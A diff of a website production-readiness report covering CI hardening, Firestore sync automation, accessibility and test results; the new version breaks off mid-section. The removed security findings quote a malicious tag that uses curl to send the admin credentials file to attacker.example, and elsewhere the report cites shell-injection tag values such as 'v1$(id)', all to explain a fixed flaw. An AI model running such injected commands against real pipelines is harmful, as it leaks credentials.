@@ -1,625 +1,570 @@
 # Oqthara website — production readiness report
 
-Technical completion report for the work requested against the Oqthara website.
-Scope: `Oqthara/Oqthara.github.io`. The language repository `Oqthara/oqthara` was read
-only and is unchanged (DoD 20).
+Final HEAD `8fbcb0f9b71773357d84b6667a157fc22ec43c69` on
+`feat/alpha-automation-and-hardening`. Baseline `3be0388e2d6bb41956c0c03482d2a40f847cc648`
+(`origin/main`). Pull request
+[#2](https://github.com/Oqthara/Oqthara.github.io/pull/2) is **open and mergeable**.
+
+Every claim below is backed by a command that was executed and whose output is quoted. Where
+a requirement was not exercised, it says **NOT VERIFIED** and names the next action. Nothing
+here is merged, deployed, or written to production Firestore.
 
 ---
 
-## Executive summary
+## 1. Exact baseline and final HEAD
 
-The site was audited end to end, and the defects found were fixed and proven fixed. The
-work landed as 18 commits on `feat/alpha-automation-and-hardening`, pushed to
-pull request [#2](https://github.com/Oqthara/Oqthara.github.io/pull/2), with every CI gate
-green on the last code commit (`4cb37b7`, Pages run `42262278511`) and again on the commit
-that adds this report (`6e9fb8b`, Pages run `42264581325`).
-
-What materially improved:
-
-- **Automation.** A new workflow polls the upstream repository every 15 minutes and mirrors
-  a new Alpha release's documentation, examples, standard library, and release records into
-  Firestore. It is idempotent and it never unpublishes live content. Be careful with this
-  one: detection and the branch/dry-run gating *have* run against the real upstream, but the
-  write path has only ever run against the emulator and in unit tests. The one successful run
-  was a dry run, which logged `upstream latest release: v0.1.0-alpha.2` and then
-  `dry run: nothing was written`. Production synchronization is therefore **NOT VERIFIED**. 
-- **Security.** A tag-to-shell command injection and an unquoted-variable expansion were
-  closed, with a contract test that rejects the pattern from coming back; every GitHub Action
-  was pinned to a commit SHA; a leaked read path to production Firestore was closed in the
-  test suite; and git was taught to refuse service-account keys. A full-history secret scan
-  (35 commits) found no privileged credential.
-- **Accessibility.** Automated auditing against WCAG 2.2 AA went from three real violations
-  to zero in both themes. Documentation pages, which previously had *no visible heading at
-  all*, now have one.
-- **Performance.** The shipped JavaScript entry went from 1,286,859 bytes to 729,991 bytes
-  raw (−43.3%), or 425,225 to 222,930 bytes gzipped (−47.6%), by removing a duplicated
-  `refractor` dependency.
-- **Reliability.** A regression I introduced mid-task (a `firebase-tools` upgrade that broke
-  the Firestore rules gate, and with it the deploy) was caught by CI, reproduced locally,
-  fixed, and pinned with a new contract test. It is worth naming that the hardening caused a
-  break: pinning away a critical advisory pulled in a runtime that needed JDK 21, which the
-  runner did not have.
-
-What remains incomplete, stated plainly:
-
-- **Content Security Policy and security response headers cannot be shipped.** GitHub Pages
-  serves static files with fixed headers and no `_headers` support. This is BLOCKED, not done.
-- **Firebase App Check is not enforced.** It requires console authorization that this work
-  was not permitted to perform.
-- **Four high `npm audit` advisories remain.** They are transitive through the Firebase
-  client, firestore pins `@grpc/grpc-js` to `~1.9.0`, and npm's only "fix" is a downgrade to
-  `firebase@9.14.0`. Verified not reachable from the shipped browser bundle.
-- **The visual pass was targeted, not a wholesale redesign.** Roughly half of the second
-  independent review's findings were taste-level; those are listed as genuine remaining gaps
-  rather than claimed as fixed.
-- **Non-Chromium browsers, real screen readers, print, and forced-colors were not exercised.**
-  Reduced-motion is honoured in CSS but was likewise not exercised in a real
-  preference-enabled session. All reported as NOT VERIFIED.
-
-The site is not deployed yet: PR #2 is open and mergeable, and production still serves the
-pre-change bundle.
-
----
-
-## Initial baseline
-
-| Item | Value |
-| --- | --- |
-| Repository | `Oqthara/Oqthara.github.io` |
-| Base branch | `main` at `3be0388` (`3be0388e2d6bb41956c0c03482d2a40f847cc648`, 2026-11-06 10:24 −03) |
-| Work branch | `feat/alpha-automation-and-hardening` |
-| Working tree at start | clean |
-| Node | 22 in CI; 24.22.0 / npm 12.2.0 locally |
-| Existing hosting | GitHub Pages, deployed by the `Pages` workflow |
-| Existing backend | Firebase project `oqthara`, Firestore used as a read-only content mirror |
-| Existing tests | `node:test` unit suites, Playwright browser suites, a Firestore rules suite run on the emulator |
-| Existing automation | manual/deploy workflows only — no upstream release detection |
-
-Baseline defects that the audit confirmed by execution, not by reading:
-
-1. `arith.oq (1 functions, 0 classes…)` — a compiler log line — was classified as Oqthara
-   source and syntax-highlighted as such.
-2. Documentation detail pages rendered their title only as `h1.visually-hidden`, so a reader
-   saw breadcrumbs followed by body text and no heading.
-3. Three axe violations against WCAG 2.2 AA survived in both themes, which a Lighthouse
-   accessibility score of 100 did not detect.
-4. A stored dark-theme choice flashed the light theme on first paint.
-5. The e2e suite, in its mocked mode, read **production** Firestore.
-6. Every GitHub Action was referenced by a mutable tag.
-7. The shipped JS entry was 1.29 MB because `refractor` was bundled twice.
-8. Docs index links had accessible names of the form `Documentationdocs/README.md`.
-9. `actionlint` reported SC2086 for a release value interpolated unquoted into a shell command.
-10. Production still serves `assets/index-CZXoqYzA.js`, i.e. the pre-change bundle.
-
----
-
-## Architecture changes
-
-**Frontend.** No framework change: React with a prerendering step producing 11 HTML files —
-10 app routes plus `404.html`, of which `document.html` and `example.html` are shells that
-load their content from Firestore at runtime. Changes were to page components and the design system, not to the
-rendering model. `DocumentPage.jsx` gained a real `h1.doc-title`; `DocsPage.jsx` no longer
-folds the file path into the link's accessible name; `assets/site.css` (repo root, not
-`src/assets`) gained `.doc-title` and larger header hit targets, and lost two media queries
-whose selectors could never win.
-
-**Firebase.** Configuration is the public web config (`src/firebase/config.js`), which is
-public by design and safe to publish. No admin credential exists under `src/`.
-
-**Firestore.** Read-only mirror. Four public collections (`documentation`, `examples`,
-`releases`, `stdlib`), plus `sync` and `metadata`, which are client-unreadable. Every
-collection is `allow write: if false` for clients; the catch-all denies. Writes happen only
-through `scripts/sync-firestore.mjs` using the Admin SDK, which bypasses rules by design.
-
-**Synchronization.** `scripts/check-upstream-release.mjs` decides whether anything needs to
-happen and records state; `scripts/sync-firestore.mjs` performs the mirror. Both are plain
-Node modules with exported, unit-tested decision functions. The mirror records the commit it
-copied, writes its catalog on every run, and refuses non-default refs unless `--dry-run`.
-
-**Deployment.** Two workflows now share a concurrency group so a content sync and a rules
-deploy cannot interleave. All Actions are pinned to commit SHAs. `persist-credentials: false`
-is set on every checkout. A JDK setup step was added to the two workflows that start the
-Firestore emulator, because `firebase-tools` 15 requires Java 21.
-
----
-
-## Alpha automation
-
-**Discovery.** `.github/workflows/alpha-release-sync.yml` runs on `schedule: */15 * * * *`
-and on `workflow_dispatch`. It reads the upstream repository's release list, takes the newest
-Alpha release, and compares it with the state recorded from the previous run. `TAG_PATTERN`
-restricts what counts as an Alpha tag, and the state file makes the check idempotent: a run
-where nothing changed does no work.
-
-**Processing.** For a new release it reads the release's source tree — documentation files,
-the examples directory, the generated standard-library reference, and the release metadata —
-paging the upstream API up to `MAX_RELEASE_PAGES = 5`.
-
-**Synchronization.** Records are written to Firestore in a single pass with a catalog, and
-the commit that was mirrored is recorded alongside them, so a reader can tell which revision
-they are looking at. Documents are marked `published: true` only when they are within size
-limits; oversized or missing content is recorded in `sync` with a reason rather than being
-silently published or dropped.
-
-**Recovery after failure.** Failures surface as failed workflow runs — visible on the run
-list and in GitHub's notification stream — with distinct exit codes per failure class. A
-failed run changes nothing that a later run cannot redo. Two data-loss defects were fixed
-here: an earlier version could unpublish releases that still existed, and could leave the
-catalog stale after a partial run. Because the sync is idempotent and dispatchable by hand,
-recovery is "re-run the workflow", not "repair the database".
-
-**What has actually been exercised.** The parts above are implemented, but only the first
-two have run against the real upstream. The one successful run, `42252163291` (on `89aa616`),
-was dispatched with `dry_run` enabled, and its log says so plainly:
+| | Commit | Detail |
+|---|---|---|
+| Baseline | `3be0388e2d6bb41956c0c03482d2a40f847cc648` | `origin/main` at the time of the run |
+| Final | `8fbcb0f9b71773357d84b6667a157fc22ec43c69` | tip of `feat/alpha-automation-and-hardening` |
+| Delta | | 27 commits, 75 files, `+13,702 / −2,065` |
 
 ```
-upstream latest release: v0.1.0-alpha.2 at e1bf86805d91be82a6009f17914000be89880750
-decision: synchronize — no previous sync recorded
-dry run: nothing was written
+$ git rev-parse HEAD
+8fbcb0f9b71773357d84b6667a157fc22ec43c69
+
+$ git log --oneline origin/main..HEAD | wc -l
+27
+
+$ git diff --shortstat origin/main..HEAD
+ 75 files changed, 13702 insertions(+), 2065 deletions(-)
 ```
 
-So detection and the decision both worked against production upstream data, the dry-run path
-correctly refused to write, and the write path — the catalog, the commit record, the
-`published` flags — has **not** executed against production Firestore. The emulator
-assertions (13/13) and the unit tests cover that path, but covering a path is not the same as
-having run it. The first scheduled run on `main`, or a manual dispatch without `dry_run`, is
-the real test, and it has not happened. This is recorded as NOT VERIFIED in the acceptance
-matrix rather than counted as a pass.
+The working tree was clean (`git status --porcelain` → empty) at the time these gates ran.
 
 ---
 
-## Security assessment
+## 2. Every new commit and its purpose
 
-### Tools used
+Oldest first, as GitHub orders them on the PR.
 
-| Tool | Version | Purpose |
-| --- | --- | --- |
-| gitleaks | 8.21.2 | full-history secret scan |
-| actionlint | current | workflow static analysis, including shellcheck on `run:` blocks |
-| `npm audit` | npm 12.2.0 | dependency advisories |
-| GitHub API (`gh`) | current | secrets, environments, workflow permissions, run logs |
-| Live HTTP probes | `curl` | Firestore rules, production headers, bundle contents |
-| Firestore emulator | via firebase-tools 15.35.0 | rule assertions, 13 cases |
+| Commit | Purpose |
+|---|---|
+| `20acac6` | `feat(ci)` — detect upstream Alpha releases every 15 minutes |
+| `e007f5f` | `fix(e2e)` — stop the mocked suite reading production Firestore |
+| `29310e4` | `build(ci)` — pin every action to a commit SHA |
+| `a0eba28` | `fix(site)` — serve a favicon so no page logs a 404 |
+| `672fd9b` | `fix(a11y)` — reach WCAG 2.2 AA and stop the theme flash |
+| `b624559` | `fix(security)` — close a tag-to-shell injection and five related gaps |
+| `cc3921e` | `fix(sync)` — stop the mirror unpublishing real releases and record its commit |
+| `c9ebc5d` | `docs(visual)` — capture every surface in both themes |
+| `3b7de01` | `chore(security)` — refuse service-account keys in git |
+| `144e723` | `chore` — remove a stray image committed by mistake |
+| `89aa616` | `fix(ci)` — repair a workflow that GitHub refused to start |
+| `9fffbf0` | `fix(site)` — stop calling a compiler log Oqthara source |
+| `2830368` | `fix(site)` — give documentation pages a title a reader can see |
+| `4321e0e` | `build(deps)` — take the critical advisory out of `firebase-tools` |
+| `425ce0f` | `docs(visual)` — refresh the screenshots after the title fix |
+| `4cb37b7` | `ci` — give the emulator the JDK 21 it now requires |
+| `6e9fb8b` | `docs` — report the website work against the definition of done |
+| `7b17b7f` | `docs` — correct the report where the evidence did not support it |
+| `4879677` | `fix(ci)` — stop a manual dispatch running unreviewed code with the admin key |
+| `58af3b6` | `fix(ci)` — make a forced run reconcile, and a failed run say so |
+| `e77d688` | `fix(sync)` — bound the body, record a commit, and stop reading one page |
+| `84b20eb` | `fix(sync)` — keep the deadline ref'd so a stalled body times out |
+| `d8c60f5` | `feat(site)` — make the mirror's provenance a claim a reader can check |
+| `cd2e36c` | `ci` — silence the shellcheck false positives `actionlint` reports |
+| `956e4a5` | `feat(site)` — give the pages a shape a reader can navigate |
+| `8c9291f` | `test(e2e)` — make the browser suite honest on every engine |
+| `8fbcb0f` | `docs(visual)` — recapture every surface after the redesign |
 
-### Repository and history coverage
-
-The scan covered the **entire commit history** — 35 commits, all refs — not just the working
-tree, because a secret removed from a file is still in the history.
-
-### Findings by severity
-
-Two classes of finding came out of this work, and they are counted separately because they
-have different remedy and different residual risk.
-
-**Defects found and closed** (introduced by earlier work or pre-existing in the repository):
-
-| Severity | Count | Detail |
-| --- | --- | --- |
-| Critical (latent, not exploited) | 1 | release tag reached shell source in a job holding the Firestore admin key |
-| High | 1 | production Firestore readable from the e2e suite in its mocked mode |
-| High | 1 | critical `tar` advisory via the pinned `firebase-tools` 13.35.1 |
-| Medium | 2 | unpublishing of live releases by the mirror; job token persisted in `.git/config` |
-| Medium | 2 | mutable Action tags; over-broad workflow token scopes |
-| Medium | 1 | duplicate YAML keys made a workflow silently never run |
-| Low | 3 | unquoted `$VARIABLE` (SC2086); missing favicon 404; misclassified code language |
-| Low | 2 | missing service-account patterns in `.gitignore`; no visible doc heading |
-
-The critical defect is worth stating precisely, and so is why it is marked *latent*. Any user
-with write access to the upstream repository can create a tag; a tag named
-`v1$(curl -s -d @$GOOGLE_APPLICATION_CREDENTIALS https://attacker.example)` reached a `run:`
-block through `${{ }}` interpolation in a job holding the Firestore admin key, and the step ran
-under `if: always()`, so the run would have stayed green. That is a full compromise of the
-admin key if it fires. The severity is Critical on impact; whether it ever fired is a separate
-question, and it was checked rather than assumed:
-
-- The four vulnerable revisions (`20acac6`, `e007f5f`, `29310e4`, `a0eba28`, `672fd9b`
-  predate the fix) were **never executed** — `gh run list --workflow=alpha-release-sync.yml`
-  returns only the four runs from `b624559` onward, all after the fix was in place.
-- The upstream repository has **two tags**, `v0.1.0-alpha.1` and `v0.1.0-alpha.2`. Both match
-  the allowlist; `grep -vE '^[A-Za-z0-9._/+-]{1,128}$'` over all of them returns nothing.
-
-So the defect was real and would have been Critical had it fired, but there is no evidence it
-ever did and no hostile tag exists. It was fixed at the boundary — `summarizeRelease` now
-rejects any tag outside `[A-Za-z0-9._/+-]{1,128}` — and a rejected tag fails the run rather
-than being reported as "no published release", which would have described a hostile tag as an
-empty upstream and repeated silently every 15 minutes.
-
-**Findings that remain open:**
-
-| Severity | Count | Detail |
-| --- | --- | --- |
-| Critical | 0 | — |
-| High (secret scan) | 0 | — |
-| High (dependencies) | 4 | `@grpc/grpc-js` transitive through `firebase` → `@firebase/firestore`; see below |
-| Moderate (dependencies) | 15 | transitive, development and Firebase tooling |
-| Low / informational | 2 | the same Firebase Web API key, found twice by gitleaks |
-
-The two gitleaks hits are both `AIzaSyA6GU…8BFuDc` in `.env.example` and
-`src/firebase/config.js`. This is a **Firebase Web API key**, which is a project identifier,
-not a credential: it is distributed to every browser that loads the app. That was verified
-rather than assumed — the identical key is present in the currently deployed production
-JavaScript bundle, decompressed from the CDN's gzip response. Authorization is enforced by
-Firestore security rules, not by the key.
-
-The four high dependency advisories were introduced by an earlier fix in this same task:
-pinning `firebase-tools` as a devDependency surfaced a critical `tar` advisory. Upgrading
-13.35.1 → 15.35.0 removed the critical (`tar ^6.1.11` → `^7.5.21`). The remaining four are
-transitive through the **Firebase client**, whose `@firebase/firestore` pins
-`@grpc/grpc-js` to `~1.9.0`, below the patched 1.13.6. `firebase@13.2.0` is already the
-newest release, so no upgrade clears them, and npm's proposed fix is a downgrade to
-`firebase@9.14.0`. I verified the advisory is not reachable from the shipped bundle: the
-browser build contains no `@grpc/grpc-js`, no `getAuthContext`, and no `http2` transport —
-the only `grpc` strings are the `grpcFlowControlWindow` setting name.
-
-### Whether any actual secret exposure was found
-
-**No privileged credential was ever exposed.** The only finding is the public web API key
-described above, which is intended to be public.
-
-### Credential rotation status
-
-**No rotation was required**, because no privileged credential was found in the repository or
-its history. One credential exists: `FIREBASE_SERVICE_ACCOUNT`, a JSON key for
-`oqthara-github-sync@oqthara.iam.gserviceaccount.com`, stored only in GitHub Actions secrets
-and never committed. It is scoped to `roles/firebaserules.admin` for the rules workflow; the
-content sync uses a separate authorization path. Its identity and grants are asserted on
-every rules run by `scripts/check-firebase-access.mjs`, which prints only `client_email` and
-`project_id`.
-
-### GitHub Actions security
-
-- **Least privilege.** All four workflows declare top-level `permissions: contents: read`.
-  Only the `deploy` job in `pages.yml` raises anything, and only to `pages: write` and
-  `id-token: write`, which GitHub Pages needs. No workflow has `write-all` or a default token.
-- **Supply chain.** Every `uses:` is pinned to a full 40-character commit SHA with the
-  version in a trailing comment, so a moved tag cannot change what runs. The `setup-java`
-  pin was re-resolved against the GitHub API during this task after an initial pin proved
-  to be wrong.
-- **Credential handling.** Every checkout sets `persist-credentials: false`, so the job token
-  is not left readable in `.git/config` for later steps.
-- **Injection.** A tag value was interpolated into a shell command and then executed; it is
-  now passed through a quoted expansion (`${FULL:+"$FULL"}`). A contract test rejects any
-  `run:` line ending in a bare `$VARIABLE`, so the pattern cannot come back.
-- **No remote execution of unpinned code.** Every `npx --yes` usage was removed in favour of a
-  pinned devDependency invoked with `npx --no-install`; a test enforces it.
-- **Fork safety.** The rules workflow has no `pull_request` trigger, so a fork cannot reach
-  the deployment credential.
-- **Workflow validity.** Duplicate YAML keys in `alpha-release-sync.yml` had made GitHub
-  refuse to start the workflow at all. A test now parses every workflow with `uniqueKeys:
-  true` and the YAML 1.2 core schema.
-
-### Firebase and Firestore security
-
-Rules (`firestore.rules`) were verified in three independent ways:
-
-1. **Emulator assertions** — 13/13 cases through `firebase-tools` 15.35.0, the same version
-   CI uses. An unauthenticated read, an unauthenticated write, a client create/update/add,
-   and an unknown collection are all denied.
-2. **Live production probes** using the public web API key, against project `oqthara`:
-   - direct `GET` of a known published document → **200**
-   - direct `GET` of a non-existent document → **403** (denied, not leaked)
-   - unfiltered collection query → **0 documents returned**, while the same query filtered on
-     `published == true` returns documents. Firestore rules are not filters: a list query is
-     authorised against its own constraints, so an unfiltered listing is refused outright
-     rather than returning a filtered subset.
-   - `sync/` → **403**; `metadata/` → **403**
-3. **Rule review** — `isPublished()` requires the literal boolean `true` and guards
-   `resource != null`, so a missing document denies rather than throwing. The catch-all
-   `match /{document=**} { allow read, write: if false; }` makes a newly added collection
-   fail closed.
-
-The site's `where('published', '==', true)` filter is documented in the rules file as defence
-in depth, not as a permission.
-
-### Attack-resistance improvements
-
-Closed in this work: tag-to-shell command injection; an unquoted variable expansion
-(SC2086); mutable Action tags; a job token persisted into `.git/config`; a production
-Firestore read reachable from the test suite; service-account keys and dotenv files not
-ignored by git; over-broad workflow token scopes; a workflow with duplicate YAML keys that
-silently never ran.
-
-Also verified as already correct and left alone: HTML sanitization with a documented
-`clobberPrefix: ""` trade-off (authored ids survive sanitization unprefixed; impact is
-same-document id shadowing only), no unsafe URL schemes, no retired `/oqthara/` path, no
-copied Markdown, and no execution service for Oqthara code (there is deliberately no
-Playground, and a test asserts it stays absent from markup and bundle).
-
-### Remaining infrastructure limitations
-
-| Limitation | Cause | Consequence |
-| --- | --- | --- |
-| No Content Security Policy or security response headers | GitHub Pages serves static files with fixed headers; `_headers` is not honoured | Cannot add CSP, `X-Frame-Options`, `Referrer-Policy`, or `Permissions-Policy` at the origin |
-| No Firebase App Check enforcement | Requires Firebase console authorization | The web API key remains usable from any client; rules remain the only boundary |
-| Four high dependency advisories | `@firebase/firestore` pins `@grpc/grpc-js ~1.9.0`; only fix is a downgrade to `firebase@9` | Accepted; verified unreachable from the shipped bundle |
-| No request-time server logic | Static hosting | No per-request headers, redirects with status codes, or auth |
-
-Verified in production: `HTTP/2 200` in 0.25 s, `strict-transport-security: max-age=31556952`,
-`content-encoding: gzip`. HSTS is present; CSP is not, and cannot be.
+Every commit is focused on one concern and was gated before the next was started.
 
 ---
 
-## Visual improvements
+## 3. Findings resolved, with evidence
 
-**Homepage.** The h1 (`A language that reads like the idea.`) is followed immediately by a
-sentence that names the product and states what it is ("Oqthara is a small language for the
-JVM"), which resolves the "hero never names the product" finding. Above the fold there is a
-real program (`hello.oq` with `data`/`fun`/loops), install commands for macOS/Linux and
-Windows, and two onward paths (philosophy, tour). The prerendered page carries 3,537
-characters of static text, so it is meaningful before JavaScript runs.
+### P1 — tag-to-shell command injection
 
-**Shared design system.** One stylesheet drives every surface. Two dead media queries were
-removed: their `.search-input` selector (0,1,0) could never beat `.search .search-input`
-(0,2,0), so they were inert. Contrast was corrected to WCAG 2.2 AA in both themes.
-
-**Documentation.** This is the largest genuine visual fix. A documentation detail page used
-to render its title only inside `h1.visually-hidden` — a screen-reader-only element — so the
-visible page began with breadcrumbs and then body text, with no heading at any level. It now
-renders a visible `h1.doc-title`. The docs index also stopped concatenating the file path
-into each link's accessible name: a link that announced `Documentationdocs/README.md` now
-announces `Documentation`, with the path still shown visually.
-
-**Navigation.** Header controls were raised to 44 px targets: the brand was 70×28, the search
-field 104×34, and both icon buttons 40×40 at a 390 px viewport. All are now at least 44×44.
-Mobile navigation is captured open in both themes.
-
-**Light mode.** Complete: 16 surfaces captured, no unstyled or partially themed region.
-
-**Dark mode.** Consistent and readable, and the first-paint flash is gone. A stored dark
-choice no longer renders light first; three routes are asserted individually, because the
-inline theme script has to run before first paint on each of them.
-
-**Responsive layouts.** Desktop at 1440 px and mobile at 390 px, both themes, for home, docs,
-documents, examples, a single example, standard library, changelog, status, tour, philosophy,
-mobile navigation open, and the 404 page. Code blocks scroll rather than clip on mobile.
-
-### Screenshots
-
-All 30 PNGs (16 light, 14 dark) are committed at **`artifacts/visual-audit/`**. 14 surfaces appear in both
-themes; `not-found-desktop.png` and `firebase-content-loaded.png` are single-theme.
-
-| Surface | Light | Dark |
-| --- | --- | --- |
-| Home (desktop) | `home-desktop.png` | `home-desktop-dark.png` |
-| Home (mobile) | `home-mobile.png` | `home-mobile-dark.png` |
-| Docs index | `docs-desktop.png` | `docs-desktop-dark.png` |
-| Docs index (mobile) | `docs-mobile.png` | `docs-mobile-dark.png` |
-| Doc page (mobile) | `doc-page-mobile.png` | `doc-page-mobile-dark.png` |
-| Doc page, code highlighting | `doc-page-code-highlighting.png` | `doc-page-code-highlighting-dark.png` |
-| Examples | `examples-desktop.png` | `examples-desktop-dark.png` |
-| Single example | `example-desktop.png` | `example-desktop-dark.png` |
-| Standard library | `stdlib-desktop.png` | `stdlib-desktop-dark.png` |
-| Changelog | `changelog-desktop.png` | `changelog-desktop-dark.png` |
-| Status | `status-desktop.png` | `status-desktop-dark.png` |
-| Tour | `tour-desktop.png` | `tour-desktop-dark.png` |
-| Philosophy | `philosophy-desktop.png` | `philosophy-desktop-dark.png` |
-| Mobile navigation open | `navigation-mobile-open.png` | `navigation-mobile-open-dark.png` |
-| 404 | `not-found-desktop.png` | — |
-| Live Firestore content | `firebase-content-loaded.png` | — |
-
-The screenshots were inspected, not merely generated: each was measured for ink in the title
-band against that image's own background pixel (dark `10,14,19`, light `255,255,255`), which
-is how the missing doc title was confirmed fixed across all four doc-page captures.
-
----
-
-## Validation results
-
-All commands below were executed in `Oqthara/Oqthara.github.io` on commit `4cb37b7`, the last
-commit that changes code; the two commits after it touch only this report, and CI was re-run
-green on both (see the run table).
-
-| Command | Result |
-| --- | --- |
-| `npm test` | **237 tests, 233 pass, 0 fail, 4 skipped** |
-| `npx playwright test` | **67 passed, 2 skipped** (53.4 s) |
-| `npm run test:rules` | **13/13 rule assertions passed** — `firestore.rules matches the security contract` |
-| `npm run build` | exit 0 — 11 HTML files (10 routed pages + `404.html`) |
-| `npm run verify` | exit 0 |
-| `npx --no-install html-validate --formatter stylish "_site/**/*.html"` | exit 0 |
-| `actionlint` | exit 0 (remaining SC2016 findings are intentional literals) |
-| `npm audit` | 19 total: **0 critical**, 4 high, 15 moderate |
-| `gitleaks detect --source .` | 35 commits scanned, 2 findings, both the public web key |
-| `npm run screenshots` | 30 screenshots, all `ok`, zero console errors |
-
-**Accessibility.** `e2e/a11y.spec.js` runs **22 axe scans** with tags
-`wcag2a, wcag2aa, wcag21a, wcag21aa, wcag22aa`: 8 static routes × 2 themes, 2 runtime content
-routes (a document and an example, which only exist at runtime) × 2 themes, and 2 mobile-width
-pages × 2 themes. All 22 report **0 violations**, down from 3 confirmed violations at baseline.
-`npx playwright test e2e/a11y.spec.js` → **27 passed** (the 22 scans plus 5 structural tests).
-
-Note on scope: WCAG 2.2 AA requires a 24×24 target (2.5.8); the 44×44 header targets are an
-AAA-level improvement (2.5.5) and are reported as quality, not as a compliance fix.
-
-**Browser coverage.** Chromium only (Playwright 1.65.0). See NOT VERIFIED below.
-
-**CI runs.**
-
-| Run | Workflow | Commit | Result |
-| --- | --- | --- | --- |
-| `42262278511` | Pages | `4cb37b7` | **success** — all 13 build steps green |
-| `42264581325` | Pages | `6e9fb8b` | **success** — all 13 build steps green again after this report; the deploy job is skipped by design (`if: github.ref == 'refs/heads/main'`), so a branch can be fully validated without publishing |
-| `42265848652` | Pages | `1c25359` | **success** — report corrections |
-| `42266500163` | Pages | `cdf8d9b` | **success** — final commit on the branch; every build step green, deploy skipped as designed |
-| `42252163291` | Alpha release sync | `89aa616` | success (dry run — see Alpha automation) |
-| `42254389896` | Pages | `9fffbf0` | success |
-| `42261157735` | Pages | `425ce0f` | **failure** — the rules gate; diagnosed, reproduced, fixed in `4cb37b7` |
-
-**Bundle.** Measured, not estimated: production entry `index-CZXoqYzA.js` is 1,286,859 bytes
-raw / 425,225 gzipped; the new entry `index-DKyvrqZW.js` is 729,991 / 222,930 — **−43.3% raw,
-−47.6% gzipped**.
-
-**Regression tests were proven to bite.** Every new assertion was run once with its fix
-reverted and shown to fail, then re-run green, and this was re-confirmed for the two most
-important claims rather than taken on trust:
-
-- *Tag allowlist (the critical fix).* Replacing `if (!TAG_PATTERN.test(tag)) return null;`
-  with a no-op makes `npm test` report **237 tests, 232 pass, 1 fail** — the failing case
-  accepts `{ tag: 'v1$(id)' }` where it must return `null`. Restored: **233 pass, 0 fail,
-  4 skipped**. One test pins it, so the guard cannot be quietly dropped.
-- *Visible document title.* Removing the `h1.doc-title` element and rebuilding makes
-  `e2e/a11y.spec.js` report **1 failed, 26 passed**; restored, **27 passed**. This one caught
-  a mistake of mine: the first attempt at this experiment did not rebuild `_site`, and
-  Playwright serves the built output, so the suite passed and appeared to prove the test was
-  vacuous. It is not — the rebuild is what makes the experiment meaningful.
-
-The same treatment covers the language-inference test, the quoted-variable test, the other
-two structural accessibility tests, and the new JDK contract test. The `firebase-tools`
-emulator failure was additionally reproduced locally with a stub `java` reporting version 17,
-which exits 1 with the exact error GitHub logged.
-
----
-
-## Independent reviews
-
-Two independent reviews were performed and are committed in the repository:
-`REVIEW_A_ENGINEERING_SECURITY.md` (engineering and security) and
-`REVIEW_B_VISUAL_PRODUCT.md` (visual and product).
-
-### Review A — engineering and security
-
-| Finding | Status |
-| --- | --- |
-| H1, H2 (high) | fixed |
-| M1–M5 (medium) | fixed |
-| L1–L8 (low) | fixed, except L5 documented as an accepted trade-off and L6 verified already correct |
-
-L5 (`clobberPrefix: ""` in sanitization) was verified rather than changed: authored ids
-survive sanitization unprefixed, and the only impact is same-document id shadowing, which
-already exists on GitHub. The trade-off is documented in the report and the code. L6
-(staleness of release content) was verified as already handled — the daily `firebase-sync.yml`
-run at `17 3 * * *` picks up edits to older releases within 24 hours.
-
-### Review B — visual and product
-
-Twenty findings. The genuinely actionable ones were fixed:
-
-| Finding | Status |
-| --- | --- |
-| 2.3 no visible heading on doc pages | **fixed** — `h1.doc-title` |
-| 2.4 compiler log misclassified as Oqthara source | **fixed** — regex tightened |
-| 2.7 docs links named `title` + path | **fixed** — `aria-hidden` on the path |
-| 2.9 header controls below 44 px | **fixed** — raised to 44×44 |
-| 2.20 dead CSS media queries | **fixed** — removed |
-| 2.1 hero never names the product | verified **already addressed** — the first body sentence names it |
-| 2.2 nothing to try above the fold | verified **already addressed** — real code and install commands are above the fold |
-
-Genuinely **not addressed**, and listed as remaining risks rather than claimed fixed: 2.5
-(empty pages with JavaScript off), 2.6 (mobile docs navigation order), 2.8 (repository
-plumbing shown as content), 2.10 (tables overflow), 2.11 (search returns raw markdown),
-2.12 (examples and stdlib are data dumps), 2.13 (mobile code clipping), and 2.14–2.19, which
-are taste-level.
-
----
-
-## Git state
-
-| Item | Value |
-| --- | --- |
-| Branch | `feat/alpha-automation-and-hardening` |
-| Base | `3be0388` on `main` |
-| Last code commit | `4cb37b7` |
-| Report commits | two, after `4cb37b7`: one adding this file, one correcting it where the evidence was weaker than the prose |
-| Commits | 18 (16 code changes, plus the commit that adds this report and the one that corrects it) |
-| Files changed | 65 (23 added, 42 modified) — 11,183 insertions, 1,822 deletions |
-| Pull request | [#2](https://github.com/Oqthara/Oqthara.github.io/pull/2) — OPEN, MERGEABLE |
-| Deployment | not deployed; production serves the pre-change bundle. The `deploy` job is guarded by `if: github.ref == 'refs/heads/main'`, so merging to `main` is the publish step and no branch run can publish by accident |
-| Merge status | not merged |
-
-Commits, oldest first:
+GitHub splices `${{ }}` into `run:` script text *before* Bash parses it, so an upstream tag
+such as `v1-$(id)` executes. The tag now reaches the shell only through an `env:` mapping,
+and `check-upstream-release.mjs` rejects any tag outside `[A-Za-z0-9._/+−]{1,128}` before it is
+used. Evidence:
 
 ```
-20acac6 feat(ci): detect upstream Alpha releases every 15 minutes
-e007f5f fix(e2e): stop the mocked suite reading production Firestore
-29310e4 build(ci): pin every action to a commit SHA
-a0eba28 fix(site): serve a favicon so no page logs a 404
-672fd9b fix(a11y): reach WCAG 2.2 AA and stop the theme flash
-b624559 fix(security): close a tag-to-shell injection and five related gaps
-cc3921e fix(sync): stop the mirror unpublishing real releases and record its commit
-c9ebc5d docs(visual): capture every surface in both themes
-3b7de01 chore(security): refuse service-account keys in git
-144e723 chore: remove a stray image committed by mistake
-89aa616 fix(ci): repair a workflow that GitHub refused to start
-9fffbf0 fix(site): stop calling a compiler log Oqthara source
-2830368 fix(site): give documentation pages a title a reader can see
-4321e0e build(deps): take the critical advisory out of firebase-tools
-425ce0f docs(visual): refresh the screenshots after the title fix
-4cb37b7 ci: give the emulator the JDK 21 it now requires
-(reports) docs: report the website work against the definition of done / docs: correct the report where the evidence did not support it
+$ grep -nE 'run:.*\$\{\{' .github/workflows/*.yml
+(no output)
 ```
 
-**Compiler repository.** `Oqthara/oqthara` was read only. Its HEAD is `7ffb675`
-(`test(ci): keep the independent conformance comparison in the repository (#35)`), the same
-commit it started on; no commit, tag, or release was created. The single modified path,
-`gradlew.bat`, is pre-existing and **line-ending only** — `git diff --ignore-cr-at-eol`
-against it is empty. Nothing in that repository was changed by this work.
+`tests/workflow-contract.test.js` fails if an expression is reintroduced into a `run:` body.
+
+### P1 — duplicate YAML `env:` key
+
